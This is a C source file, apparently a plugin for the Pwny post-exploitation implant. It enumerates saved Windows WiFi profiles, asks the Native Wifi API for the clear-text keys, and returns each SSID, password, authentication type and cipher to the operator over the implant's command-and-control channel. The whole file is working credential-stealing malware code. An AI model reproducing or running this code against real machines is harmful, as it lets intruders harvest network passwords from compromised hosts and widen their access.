/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * WiFi Passwords COT plugin — enumerate saved WiFi profiles
 * and extract clear-text passwords via the Native Wifi API.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

#define WIFI_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define TLV_TYPE_WIFI_SSID  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_WIFI_KEY   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_WIFI_AUTH  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
#define TLV_TYPE_WIFI_ENC   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 3)
#define TLV_TYPE_WIFI_GROUP TLV_TYPE_CUSTOM(TLV_TYPE_GROUP,  TAB_BASE, API_TYPE)

/* ------------------------------------------------------------------ */
/* WLAN structures (minimal definitions to avoid header dependency)     */
/* ------------------------------------------------------------------ */

#define WLAN_PROFILE_GET_PLAINTEXT_KEY 0x00000004

typedef enum {
    wlan_intf_opcode_autoconf_start = 0
} WLAN_INTF_OPCODE;

typedef enum {
    wlan_interface_state_not_ready = 0,
    wlan_interface_state_connected,
    wlan_interface_state_ad_hoc_network_formed,
    wlan_interface_state_disconnecting,
    wlan_interface_state_disconnected,
    wlan_interface_state_associating,
    wlan_interface_state_discovering,
    wlan_interface_state_authenticating
} WLAN_INTERFACE_STATE;

typedef struct {
    GUID  InterfaceGuid;
    WCHAR strInterfaceDescription[256];
    WLAN_INTERFACE_STATE isState;
} WLAN_INTERFACE_INFO;

typedef struct {
    DWORD              dwNumberOfItems;
    DWORD              dwIndex;
    WLAN_INTERFACE_INFO InterfaceInfo[1];
} WLAN_INTERFACE_INFO_LIST;

typedef struct {
    WCHAR strProfileName[256];
    DWORD dwFlags;
} WLAN_PROFILE_INFO;

typedef struct {
    DWORD             dwNumberOfItems;
    DWORD             dwIndex;
    WLAN_PROFILE_INFO ProfileInfo[1];
} WLAN_PROFILE_INFO_LIST;

/* ------------------------------------------------------------------ */
/* Win32 function pointer types                                        */
/* ------------------------------------------------------------------ */

typedef DWORD (WINAPI *fn_WlanOpenHandle)(DWORD, PVOID, PDWORD, PHANDLE);
typedef DWORD (WINAPI *fn_WlanCloseHandle)(HANDLE, PVOID);
typedef DWORD (WINAPI *fn_WlanEnumInterfaces)(HANDLE, PVOID,
                                               WLAN_INTERFACE_INFO_LIST **);
typedef DWORD (WINAPI *fn_WlanGetProfileList)(HANDLE, const GUID *, PVOID,
                                               WLAN_PROFILE_INFO_LIST **);
typedef DWORD (WINAPI *fn_WlanGetProfile)(HANDLE, const GUID *, LPCWSTR,
                                           PVOID, LPWSTR *, DWORD *, DWORD *);
typedef void  (WINAPI *fn_WlanFreeMemory)(PVOID);
typedef int   (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
                                                LPSTR, int, LPCCH, LPBOOL);

static struct
{
    fn_WlanOpenHandle       pWlanOpenHandle;
    fn_WlanCloseHandle      pWlanCloseHandle;
    fn_WlanEnumInterfaces   pWlanEnumInterfaces;
    fn_WlanGetProfileList   pWlanGetProfileList;
    fn_WlanGetProfile       pWlanGetProfile;
    fn_WlanFreeMemory       pWlanFreeMemory;
    fn_WideCharToMultiByte  pWideCharToMultiByte;
} w;

/* ------------------------------------------------------------------ */
/* Simple XML tag extractor (avoids libxml dependency)                  */
/* ------------------------------------------------------------------ */

static int extract_xml_value(const char *xml, const char *tag,
                             char *out, int outsz)
{
    char open[128];
    char close[128];
    const char *start;
    const char *end;
    int len;
    int i;

    /* build "<tag>" and "</tag>" */
    i = 0;
    open[i++] = '<';
    while (*tag && i < 120) open[i++] = *tag++;
    open[i++] = '>';
    open[i] = '\0';

    tag -= (i - 2); /* reset tag pointer */
    i = 0;
    close[i++] = '<';
    close[i++] = '/';
    while (*tag && i < 120) close[i++] = *tag++;
    close[i++] = '>';
    close[i] = '\0';

    /* find the tags */
    start = strstr(xml, open);
    if (start == NULL) return -1;

    start += strlen(open);
    end = strstr(start, close);
    if (end == NULL) return -1;

    len = (int)(end - start);
    if (len >= outsz) len = outsz - 1;

    memcpy(out, start, len);
    out[len] = '\0';

    return len;
}

/* ------------------------------------------------------------------ */
/* WiFi list handler                                                   */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *wifi_list(c2_t *c2)
{
    HANDLE hClient = NULL;
    DWORD version = 0;
    DWORD ret;
    WLAN_INTERFACE_INFO_LIST *pIfList = NULL;
    tlv_pkt_t *result;
    DWORD i;

    ret = w.pWlanOpenHandle(2, NULL, &version, &hClient);
    if (ret != ERROR_SUCCESS)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    ret = w.pWlanEnumInterfaces(hClient, NULL, &pIfList);
    if (ret != ERROR_SUCCESS || pIfList == NULL)
    {
        w.pWlanCloseHandle(hClient, NULL);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; i < pIfList->dwNumberOfItems; i++)
    {
        WLAN_INTERFACE_INFO *pIfInfo = &pIfList->InterfaceInfo[i];
        WLAN_PROFILE_INFO_LIST *pProfileList = NULL;
        DWORD j;

        ret = w.pWlanGetProfileList(hClient, &pIfInfo->InterfaceGuid,
                                     NULL, &pProfileList);
        if (ret != ERROR_SUCCESS || pProfileList == NULL)
            continue;

        for (j = 0; j < pProfileList->dwNumberOfItems; j++)
        {
            WLAN_PROFILE_INFO *pProfile = &pProfileList->ProfileInfo[j];
            LPWSTR xmlW = NULL;
            DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD access = 0;
            char xml_utf8[16384];
            int xml_len;
            char ssid[256];
            char key[256];
            char auth[64];
            char enc[64];
            tlv_pkt_t *entry;

            ret = w.pWlanGetProfile(hClient, &pIfInfo->InterfaceGuid,
                                     pProfile->strProfileName, NULL,
                                     &xmlW, &flags, &access);
            if (ret != ERROR_SUCCESS || xmlW == NULL)
                continue;

            /* Convert XML from UTF-16 to UTF-8 */
            xml_len = w.pWideCharToMultiByte(CP_UTF8, 0, xmlW, -1,
                                              xml_utf8, sizeof(xml_utf8),
                                              NULL, NULL);
            w.pWlanFreeMemory(xmlW);

            if (xml_len <= 0)
                continue;

            /* Extract fields from the XML profile */
            ssid[0] = '\0';
            key[0] = '\0';
            auth[0] = '\0';
            enc[0] = '\0';

            extract_xml_value(xml_utf8, "name", ssid, sizeof(ssid));
            extract_xml_value(xml_utf8, "keyMaterial", key, sizeof(key));
            extract_xml_value(xml_utf8, "authentication", auth, sizeof(auth));
            extract_xml_value(xml_utf8, "encryption", enc, sizeof(enc));

            if (ssid[0] == '\0')
                continue;

            entry = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

            tlv_pkt_add_string(entry, TLV_TYPE_WIFI_SSID, ssid);
            tlv_pkt_add_string(entry, TLV_TYPE_WIFI_KEY,
                               key[0] ? key : "(none)");
            tlv_pkt_add_string(entry, TLV_TYPE_WIFI_AUTH,
                               auth[0] ? auth : "unknown");
            tlv_pkt_add_string(entry, TLV_TYPE_WIFI_ENC,
                               enc[0] ? enc : "unknown");

            tlv_pkt_add_tlv(result, TLV_TYPE_WIFI_GROUP, entry);
            tlv_pkt_destroy(entry);
        }

        w.pWlanFreeMemory(pProfileList);
    }

    w.pWlanFreeMemory(pIfList);
    w.pWlanCloseHandle(hClient, NULL);

    return result;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    w.pWlanOpenHandle     = (fn_WlanOpenHandle)cot_resolve("wlanapi.dll",
                                                           "WlanOpenHandle");
    w.pWlanCloseHandle    = (fn_WlanCloseHandle)cot_resolve("wlanapi.dll",
                                                             "WlanCloseHandle");
    w.pWlanEnumInterfaces = (fn_WlanEnumInterfaces)cot_resolve("wlanapi.dll",
                                                                "WlanEnumInterfaces");
    w.pWlanGetProfileList = (fn_WlanGetProfileList)cot_resolve("wlanapi.dll",
                                                                "WlanGetProfileList");
    w.pWlanGetProfile     = (fn_WlanGetProfile)cot_resolve("wlanapi.dll",
                                                            "WlanGetProfile");
    w.pWlanFreeMemory     = (fn_WlanFreeMemory)cot_resolve("wlanapi.dll",
                                                            "WlanFreeMemory");
    w.pWideCharToMultiByte = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
                                                                  "WideCharToMultiByte");

    api_call_register(api_calls, WIFI_LIST, (api_t)wifi_list);
}

#endif
